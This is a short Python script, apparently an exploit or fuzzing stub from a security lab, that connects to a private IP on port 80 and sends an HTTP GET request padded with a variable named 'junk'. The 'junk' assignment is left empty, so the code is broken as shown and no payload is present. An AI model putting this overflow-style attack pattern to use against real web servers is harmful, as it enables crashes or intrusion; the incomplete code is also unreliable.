#!/usr/bin/python
import socket

junk = 


s = socket.socket()
s.connect(('192.168.129.128',80))
s.send("GET " + junk + " HTTP/1.0\r\n\r\n") 
s.close()
